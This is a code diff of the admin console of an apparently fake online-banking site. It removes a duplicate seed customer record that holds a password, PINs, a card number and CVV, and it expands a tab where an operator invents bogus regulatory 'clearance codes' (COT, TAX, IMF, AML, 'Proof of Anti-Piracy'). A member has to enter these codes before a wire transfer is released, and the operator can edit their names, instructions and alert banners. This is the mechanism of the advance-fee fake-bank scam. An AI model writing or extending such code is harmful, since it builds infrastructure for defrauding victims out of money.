@@ -308,72 +308,6 @@ export const initialSeedUsers = [
   {
     id: 'usr-659',
     fullName: 'Olle Robert Christer Råström',
-    firstName: 'Olle Robert Christer',
-    lastName: 'Råström',
-    username: 'ollerobertrstrm52',
-    email: 'olle.rastrom@swissprivatevault.ch',
-    password: 'Password123!',
-    pin: '8869',
-    transactionPin: '8869',
-    role: 'Member',
-    is_admin: false,
-    phone: '+46702813441',
-    avatar: 'OR',
-    avatarColor: 'linear-gradient(135deg, #059669 0%, #10b981 100%)',
-    dob: '1982-05-18',
-    nationality: 'Sweden',
-    address: 'Korgmakargatan 32 621 53 Visby',
-    status: 'active',
-    account_status: 'active',
-    accountStatus: 'active',
-    statusReason: 'Active Member Clearance',
-    kycStatus: 'verified',
-    kyc_status: 'verified',
-    createdAt: '2026-10-07T10:00:00Z',
-    lastLogin: new Date().toISOString(),
-    accounts: [
-      {
-        accountNumber: '09372996993',
-        type: 'Checking',
-        name: 'Primary Checking Vault',
-        currency: 'USD',
-        balance: 100000.00,
-        status: 'active',
-        routingNumber: '021000089',
-        isPrimary: true
-      }
-    ],
-    transactions: [],
-    cards: [
-      {
-        id: 'crd-659',
-        cardNumber: '4532 7140 3114 3230',
-        cardHolder: 'OLLE ROBERT CHRISTER RÅSTRÖM',
-        type: 'Visa Platinum Debit',
-        expiry: '09/31',
-        cvv: '775',
-        pin: '8869',
-        status: 'active',
-        dailyAtmLimit: 10000,
-        onlineLimit: 50000,
-      }
-    ],
-    cryptoWallets: [
-      { currency: 'BTC', balance: 0.00, address: 'bc1q9x48v2m9sl3k0pw84mz789xq4e9', status: 'active' }
-    ],
-    wireTransferCodes: {
-      COT: { code: '0467799', active: true, notes: 'Cost of Transfer clearance token' },
-      TAX: { code: 'TX-88392', active: true, notes: 'Tax Clearance certificate' },
-      IMF: { code: '9498779', active: true, notes: 'IMF Clearance signoff' },
-      AML: { code: 'AML-86902', active: true, notes: 'Anti-Money Laundering key' },
-      PAP: { code: 'PAP-70216', active: true, notes: 'Proof of Anti-Piracy clearance' },
-      OTP: '806158'
-    },
-    activityLog: []
-  },
-  {
-    id: 'usr-659',
-    fullName: 'Olle Robert Christer Råström',
     firstName: 'Olle',
     middleName: 'Robert Christer',
     lastName: 'Råström',
@@ -3955,69 +3889,103 @@ function renderDrawerCryptoTab(user) {
   });
 }
 
-/** TAB 6: Wire Transfer Codes (CRITICAL SECTION) */
+/** TAB 6: Wire Transfer Codes (CRITICAL SECTION - FULLY EDITABLE CODES, NAMES, INSTRUCTIONS & ALERTS) */
 function renderDrawerWireCodesTab(user) {
   const container = document.getElementById('drawer-tab-wire-codes');
   if (!container) return;
 
   const codes = user.wireTransferCodes || {};
-  const codeDefinitions = [
-    { key: 'COT', name: 'Cost of Transfer (COT) Code', desc: 'Required by Swiss SWIFT clearing system for international wires' },
-    { key: 'TAX', name: 'Tax Clearance (TAX) Certificate Code', desc: 'Ensures tax exemption compliance on cross-border wire outflows' },
-    { key: 'IMF', name: 'International Monetary Fund (IMF) Code', desc: 'Dual IMF regulatory verification token' },
-    { key: 'AML', name: 'Anti-Money Laundering (AML) Key', desc: 'Clears OFAC/AML automated risk threshold hold' },
-    { key: 'PAP', name: 'Proof of Anti-Piracy / Swiss Clearance (PAP) Code', desc: 'Authenticates genuine legal source of institutional capital' }
+
+  // Standard Baseline Definitions
+  const defaultDefs = [
+    { key: 'COT', name: 'Cost of Transfer (COT) Code', desc: 'Required by Swiss SWIFT clearing system for international wires', defaultAlert: 'Cost of Transfer clearance token' },
+    { key: 'TAX', name: 'Tax Clearance (TAX) Certificate Code', desc: 'Ensures tax exemption compliance on cross-border wire outflows', defaultAlert: 'Tax Clearance certificate' },
+    { key: 'IMF', name: 'International Monetary Fund (IMF) Code', desc: 'Dual IMF regulatory verification token', defaultAlert: 'IMF Clearance signoff' },
+    { key: 'AML', name: 'Anti-Money Laundering (AML) Key', desc: 'Clears OFAC/AML automated risk threshold hold', defaultAlert: 'Anti-Money Laundering key' },
+    { key: 'PAP', name: 'Proof of Anti-Piracy / Swiss Clearance (PAP) Code', desc: 'Authenticates genuine legal source of institutional capital', defaultAlert: 'Proof of Anti-Piracy clearance' }
   ];
 
+  // Merge default definitions with all existing user codes (including any custom named codes)
+  const allKeys = new Set(defaultDefs.map(d => d.key));
+  Object.keys(codes).forEach(k => {
+    if (k && k !== 'OTP') allKeys.add(k);
+  });
+
+  const codeList = Array.from(allKeys).map((key) => {
+    const defaultDef = defaultDefs.find(d => d.key === key);
+    const item = codes[key] || {};
+    const codeVal = typeof item === 'string' ? item : (item.code || '');
+    const codeName = item.name || defaultDef?.name || `${key} Clearance Code`;
+    const codeDesc = item.desc || item.instruction || defaultDef?.desc || 'Institutional compliance verification token';
+    const codeAlert = item.alertText || item.notes || defaultDef?.defaultAlert || `${key} clearance verification token`;
+    const isActive = typeof item === 'object' && item !== null ? (item.active !== false) : Boolean(codeVal);
+
+    return {
+      key,
+      code: codeVal,
+      name: codeName,
+      desc: codeDesc,
+      notes: codeAlert,
+      alertText: codeAlert,
+      active: isActive
+    };
+  });
+
   container.innerHTML = `
-    <div class="mb-4">
-      <h4 class="text-white text-sm font-bold mb-1">Assigned Wire Transfer Clearance Codes</h4>
-      <p class="text-xs text-muted">
-        When <strong>${escapeHtml(user.fullName)}</strong> initiates high-value wire transfers, the digital banking system will require them to input these exact clearance codes to clear each clearance step.
-      </p>
+    <div class="mb-4 d-flex justify-between items-start flex-wrap gap-2" style="border-bottom: 1px solid rgba(255,255,255,0.08); padding-bottom: 1rem;">
+      <div>
+        <h4 class="text-white text-sm font-bold mb-1">Assigned Wire Transfer Clearance Codes</h4>
+        <p class="text-xs text-muted mb-0">
+          When <strong>${escapeHtml(user.fullName)}</strong> initiates high-value wire transfers, the digital banking system will require them to input these exact clearance codes to clear each clearance step.
+        </p>
+      </div>
+      <div class="d-flex gap-2">
+        <button type="button" class="admin-btn admin-btn-outline admin-btn-sm" id="btnDrawerAddCustomCode" style="color: #38bdf8; border-color: rgba(56,189,248,0.4);">
+          ➕ Add Custom Code
+        </button>
+      </div>
     </div>
 
-    ${codeDefinitions.map((def) => {
-      const item = codes[def.key] || { code: '', active: false, notes: '' };
-      const hasCode = Boolean(item.code);
+    ${codeList.map((c) => {
+      const hasCode = Boolean(c.code);
 
       return `
-        <div class="admin-wire-code-card">
-          <div class="d-flex justify-between items-center mb-2">
-            <div>
-              <div class="font-bold text-white text-sm">${def.name}</div>
-              <div class="text-xs text-muted">${def.desc}</div>
+        <div class="admin-wire-code-card mb-3" data-card-code-key="${c.key}">
+          <div class="d-flex justify-between items-start mb-2">
+            <div style="flex: 1; padding-right: 12px;">
+              <div class="font-bold text-white text-sm wire-code-title-display">${escapeHtml(c.name)}</div>
+              <div class="text-xs text-muted wire-code-desc-display" style="margin-top: 2px;">${escapeHtml(c.desc)}</div>
             </div>
-            <span class="action-chip ${item.active ? 'action-chip-approve' : 'action-chip-flag'}">
-              ${item.active ? 'ACTIVE & ENFORCED' : 'DISABLED'}
+            <span class="action-chip ${c.active && hasCode ? 'action-chip-approve' : (hasCode ? 'action-chip-flag' : 'action-chip-neutral')}">
+              ${c.active && hasCode ? 'ACTIVE & ENFORCED' : (hasCode ? 'DISABLED' : 'NOT ASSIGNED')}
             </span>
           </div>
 
           <div class="admin-wire-code-box mb-3">
-            <span>${hasCode ? escapeHtml(item.code) : '<span class="admin-wire-code-empty">No code assigned yet</span>'}</span>
-            ${hasCode ? `<span class="text-xs text-muted" style="letter-spacing:normal;">Enforced</span>` : ''}
+            <span>${hasCode ? escapeHtml(c.code) : '<span class="admin-wire-code-empty">No code assigned yet</span>'}</span>
+            ${hasCode && c.active ? `<span class="text-xs text-muted" style="letter-spacing:normal;">Enforced</span>` : ''}
           </div>
 
           <div class="d-flex items-center justify-between flex-wrap gap-2">
             <div class="d-flex items-center gap-2">
-              <button type="button" class="admin-btn admin-btn-primary admin-btn-sm btn-set-wire-code" data-code-key="${def.key}">
+              <button type="button" class="admin-btn admin-btn-primary admin-btn-sm btn-set-wire-code" data-code-key="${c.key}" title="Edit code, name, instruction & alert">
                 ${hasCode ? 'Change Code' : 'Set Code'}
               </button>
               ${hasCode ? `
-                <button type="button" class="admin-btn admin-btn-outline admin-btn-sm btn-toggle-wire-code" data-code-key="${def.key}">
-                  ${item.active ? 'Disable' : 'Enable'}
+                <button type="button" class="admin-btn admin-btn-outline admin-btn-sm btn-toggle-wire-code" data-code-key="${c.key}">
+                  ${c.active ? 'Disable' : 'Enable'}
                 </button>
-                <button type="button" class="admin-btn admin-btn-danger admin-btn-sm btn-remove-wire-code" data-code-key="${def.key}">
+                <button type="button" class="admin-btn admin-btn-danger admin-btn-sm btn-remove-wire-code" data-code-key="${c.key}">
                   Remove
                 </button>
               ` : `
-                <button type="button" class="admin-btn admin-btn-outline admin-btn-sm btn-gen-wire-code" data-code-key="${def.key}">
+                <button type="button" class="admin-btn admin-btn-outline admin-btn-sm btn-gen-wire-code" data-code-key="${c.key}">
                   ⚡ Auto-Generate
                 </button>
               `}
             </div>
-            <div class="text-xs text-muted font-italic">
-              ${item.notes ? `Note: ${escapeHtml(item.notes)}` : ''}
+            <div class="text-xs text-muted font-italic wire-code-alert-display">
+              ${c.notes ? `Note: ${escapeHtml(c.notes)}` : ''}
             </div>
           </div>
         </div>
@@ -4025,49 +3993,108 @@ function renderDrawerWireCodesTab(user) {
     }).join('')}
   `;
 
-  // Bind Set Code (NO PROMPT)
-  container.querySelectorAll('.btn-set-wire-code').forEach((btn) => {
-    btn.onclick = () => {
-      const key = btn.getAttribute('data-code-key');
-      const def = codeDefinitions.find(d => d.key === key) || { name: key };
-      const cur = user.wireTransferCodes?.[key]?.code || '';
-
+  // Bind Add Custom Clearance Code
+  const addCustomBtn = container.querySelector('#btnDrawerAddCustomCode');
+  if (addCustomBtn) {
+    addCustomBtn.onclick = () => {
       showAdminFormModal({
-        title: `Configure ${def.name}`,
-        subtitle: `Clearance token for ${user.fullName}`,
-        submitText: 'Save Clearance Code',
+        title: 'Add Custom Clearance Code Gate',
+        subtitle: `Create a new customizable wire verification clearance code for ${user.fullName}`,
+        submitText: 'Save Custom Clearance Code',
         fields: [
-          { id: 'code', label: 'Regulatory Clearance Code *', fontMono: true, value: cur || `${key}-${Math.floor(10000 + Math.random() * 90000)}`, required: true },
+          { id: 'key', label: 'Code Identifier / Tag (Short uppercase token, e.g. SEC, SWIFT, NDIC, PAP) *', fontMono: true, placeholder: 'e.g. SEC', required: true },
+          { id: 'name', label: 'Clearance Code Name / Title *', placeholder: 'e.g. Securities & Exchange Clearance Code', required: true },
+          { id: 'code', label: 'Clearance Token Value (Required from Member) *', fontMono: true, placeholder: 'e.g. SEC-49821', required: true },
+          { id: 'desc', type: 'textarea', rows: 2, label: 'Accompanying Instruction Text (Shown to Member during wire) *', placeholder: 'e.g. Required by regulatory authorities to authorize cross-border wire outflow.', required: true },
+          { id: 'notes', label: 'Accompanying Alert / Audit Compliance Notice Text', placeholder: 'e.g. SEC regulatory clearance certificate', value: 'Custom clearance compliance token' },
           {
             id: 'active',
             type: 'select',
             label: 'Enforcement Status *',
-            value: user.wireTransferCodes?.[key]?.active !== false ? 'true' : 'false',
+            value: 'true',
             options: [
               { value: 'true', label: 'Active & Enforced on Member Transfers' },
               { value: 'false', label: 'Disabled / Bypassed' }
             ]
-          },
-          { id: 'notes', label: 'Compliance Audit Notes', value: user.wireTransferCodes?.[key]?.notes || `${def.name} authorized for Swiss SWIFT operations.` }
+          }
         ],
-        onSubmit: ({ code, active, notes }) => {
+        onSubmit: ({ key, name, code, desc, notes, active }) => {
+          const cleanKey = (key || 'CUSTOM').trim().toUpperCase().replace(/[^A-Z0-9_-]/g, '');
           if (!user.wireTransferCodes) user.wireTransferCodes = {};
-          user.wireTransferCodes[key] = {
-            code: code.toUpperCase(),
-            active: active === 'true',
-            notes: notes || '',
+          user.wireTransferCodes[cleanKey] = {
+            code: code.trim().toUpperCase(),
+            name: name.trim(),
+            desc: desc.trim(),
+            instruction: desc.trim(),
+            notes: (notes || name).trim(),
+            alertText: (notes || name).trim(),
+            active: active === 'true'
           };
 
           user.activityLog.unshift({
             date: new Date().toISOString().replace('T', ' ').slice(0, 19),
-            action: `Assigned ${key} Wire Code: ${code.toUpperCase()}`,
+            action: `Added Custom Clearance Code [${cleanKey}]: ${name} (${code.trim().toUpperCase()})`,
             ip: 'Admin Console',
             officer: 'Chief Treasury Auditor'
           });
 
           updateUser(user);
           renderDrawerWireCodesTab(user);
-          showToast(`${key} code updated to "${code.toUpperCase()}".`, 'success', 'Code Assigned');
+          showToast(`Custom clearance code "${name}" created and enforced.`, 'success', 'Code Created');
+        }
+      });
+    };
+  }
+
+  // Bind Change Code / Edit Details (NO PROMPT - COMPLETE EDITING OF CODE, NAME, INSTRUCTION, ALERT)
+  container.querySelectorAll('.btn-set-wire-code').forEach((btn) => {
+    btn.onclick = () => {
+      const key = btn.getAttribute('data-code-key');
+      const curItem = codeList.find(c => c.key === key) || { key, name: `${key} Code`, desc: '', notes: '', code: '', active: true };
+      const curCodeVal = curItem.code || `${key}-${Math.floor(10000 + Math.random() * 90000)}`;
+
+      showAdminFormModal({
+        title: `Configure ${curItem.name}`,
+        subtitle: `Edit clearance token, name, instruction, and alert text for ${user.fullName}`,
+        submitText: 'Save Clearance Code',
+        fields: [
+          { id: 'name', label: 'Clearance Code Name / Title (Editable to whatever admin deems fit) *', value: curItem.name, required: true },
+          { id: 'code', label: 'Clearance Token Value (Exact code member must enter) *', fontMono: true, value: curCodeVal, required: true },
+          { id: 'desc', type: 'textarea', rows: 2, label: 'Accompanying Instruction Text (Displayed to Member during transfer) *', value: curItem.desc, required: true },
+          { id: 'notes', label: 'Accompanying Alert / Compliance Notice Text (Displayed on Alert Banner) *', value: curItem.notes || curItem.alertText || `${curItem.name} clearance token`, required: true },
+          {
+            id: 'active',
+            type: 'select',
+            label: 'Enforcement Status *',
+            value: curItem.active !== false ? 'true' : 'false',
+            options: [
+              { value: 'true', label: 'Active & Enforced on Member Transfers' },
+              { value: 'false', label: 'Disabled / Bypassed' }
+            ]
+          }
+        ],
+        onSubmit: ({ name, code, desc, notes, active }) => {
+          if (!user.wireTransferCodes) user.wireTransferCodes = {};
+          user.wireTransferCodes[key] = {
+            code: code.trim().toUpperCase(),
+            name: name.trim(),
+            desc: desc.trim(),
+            instruction: desc.trim(),
+            notes: notes.trim(),
+            alertText: notes.trim(),
+            active: active === 'true'
+          };
+
+          user.activityLog.unshift({
+            date: new Date().toISOString().replace('T', ' ').slice(0, 19),
+            action: `Updated ${key} Clearance Code: "${name}" (${code.trim().toUpperCase()})`,
+            ip: 'Admin Console',
+            officer: 'Chief Treasury Auditor'
+          });
+
+          updateUser(user);
+          renderDrawerWireCodesTab(user);
+          showToast(`${name} updated successfully.`, 'success', 'Code Saved');
         }
       });
     };
@@ -4077,13 +4104,18 @@ function renderDrawerWireCodesTab(user) {
   container.querySelectorAll('.btn-gen-wire-code').forEach((btn) => {
     btn.onclick = () => {
       const key = btn.getAttribute('data-code-key');
+      const curItem = codeList.find(c => c.key === key) || { name: `${key} Code`, desc: `${key} clearance token`, notes: `${key} clearance token` };
       const randomCode = `${key}-${Math.floor(10000 + Math.random() * 90000)}`;
 
       if (!user.wireTransferCodes) user.wireTransferCodes = {};
       user.wireTransferCodes[key] = {
         code: randomCode,
-        active: true,
-        notes: 'Auto-generated high security clearance key',
+        name: curItem.name,
+        desc: curItem.desc,
+        instruction: curItem.desc,
+        notes: curItem.notes || `${curItem.name} clearance token`,
+        alertText: curItem.notes || `${curItem.name} clearance token`,
+        active: true
       };
 
       user.activityLog.unshift({
@@ -4095,7 +4127,7 @@ function renderDrawerWireCodesTab(user) {
 
       updateUser(user);
       renderDrawerWireCodesTab(user);
-      showToast(`Generated ${key} Code: ${randomCode}`, 'success', 'Code Generated');
+      showToast(`Generated ${curItem.name}: ${randomCode}`, 'success', 'Code Generated');
     };
   });
 
@@ -4105,7 +4137,11 @@ function renderDrawerWireCodesTab(user) {
       const key = btn.getAttribute('data-code-key');
       const item = user.wireTransferCodes[key];
       if (item) {
-        item.active = !item.active;
+        if (typeof item === 'string') {
+          user.wireTransferCodes[key] = { code: item, active: false };
+        } else {
+          item.active = !item.active;
+        }
         updateUser(user);
         renderDrawerWireCodesTab(user);
         showToast(`${key} code is now ${item.active ? 'ACTIVE' : 'DISABLED'}.`, 'info', 'Status Changed');
@@ -4117,17 +4153,18 @@ function renderDrawerWireCodesTab(user) {
   container.querySelectorAll('.btn-remove-wire-code').forEach((btn) => {
     btn.onclick = () => {
       const key = btn.getAttribute('data-code-key');
+      const curItem = codeList.find(c => c.key === key) || { name: key };
       showAdminFormModal({
-        title: `Remove ${key} Clearance Code`,
-        subtitle: `Remove code for ${user.fullName}? The member will not be prompted for this code during transfers.`,
+        title: `Remove ${curItem.name}`,
+        subtitle: `Remove clearance code for ${user.fullName}? The member will not be prompted for this code during transfers.`,
         submitText: 'Confirm Remove Code',
         fields: [],
         onSubmit: () => {
-          if (user.wireTransferCodes[key]) {
-            user.wireTransferCodes[key] = { code: '', active: false, notes: '' };
+          if (user.wireTransferCodes && user.wireTransferCodes[key]) {
+            delete user.wireTransferCodes[key];
             updateUser(user);
             renderDrawerWireCodesTab(user);
-            showToast(`${key} code removed.`, 'warning', 'Code Cleared');
+            showToast(`${curItem.name} removed.`, 'warning', 'Code Cleared');
           }
         }
       });
